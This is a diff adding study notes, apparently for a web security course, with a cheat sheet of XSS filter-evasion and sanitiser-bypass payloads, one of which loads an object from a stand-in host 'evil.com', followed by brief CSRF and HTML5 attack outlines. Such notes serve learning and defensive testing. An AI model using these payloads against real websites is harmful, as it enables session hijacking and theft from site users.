@@ -62,4 +62,60 @@ If no such auth mechanism is present the text before authority is ignored.
 ### XSS - Cross Site Scripting
 * Types ->> Stored, Reflected, DOM, Universal
 
+## Module 4 
+
+### XSS - Cross Site Scripting - Filter evasion and Waf bypass
+* Bypass Weak `<script>` tag bans
+	- `<ScRiPt>alert();</ScRiPt>`
+	- `<ScRiPt>alert();`
+	- `<scr\x00ipt>alert()</scr\x00ipt>`
+* Don't use `<script>` tags.. Use HTML attributes
+	- `<a href="javascript:alert(1)">show></a>`
+	- `<form action="javascript:alert(1)"><button>send</button></form>`
+	- `<object data="//evil.com/xss.swf">`
+	- `<img src=x onerror=alert(1)>`
+	- `<svg//////onload=alert(1)>`
+	- `<svg/onload=alert(1)>`
+* Character Escaping
+	- Instead of `alert` use `prompt`, `confirm` etc.
+	- Character Unicode --> `<script>\u0061lert(1)</script>`
+	- Decimal , Octal or Hexadecimal Encode --> `<img src=x onerror="eval('\x61lert')"/>`
+	- Constructing Strings --> `/ale/.source+/rt/.source` and `atob("YWxlcq==")` and `17795081..toString(36)`
+	- Pseudo-protocols 
+		-- Data --> `<object data="data:text/html,<script>alert(1)</script>">` , if "data:" word is blocked use `DaTa:` or `data&colon;`
+		-- vbscript --> `<img src=a onerror="vbscript:msgbox 1"/>` or `<iMg src=a onErRor="vBsCriPt:AlErT(4)"/>`
+
+* Bypass Santization 
+	- Not checked recursively --> is `<script>` is blocked try `<scr<script>ipt>alert(1)</script>`
+	- Checked only once --> `<scr<iframe>ipt>alert(1)</script>`
+	- Escape apostrophe `'` use `\'`, escape backslash `\'` use `\\'`  
+
+
+## Module 5
+
+### CSRF Recap
+* CSRF forces web applications to perform arbitary operations on behalf of the attacker.
+* Web application is vuln to CSRF only if :
+	- Application relies on HTTP Cookies and Basic Authentication for tracking sessions.
+	- No uncontrollable paramters are present.
+	- Sensitive action can be performed.
+	
+
+## Module 6
+
+### HTML 5
+* Attack Scenarios - Session Hijacking, User Tracking, Disclosure of Confidential Data etc.
+* SOP, CORS 
+* XSS, Shell of the Future
+* Cross Directory attacks
+* IndexedDB vs WebSQL Database
+* Browser-Based Botnet - Infect and Manage Persistence
+* CSP 
+* UI Redressing - x-Jacking Art, ClickJacking, LikeJacking, StrokeJacking,   
+
+
+## Module 7
+
+### SQL Injection
+
 
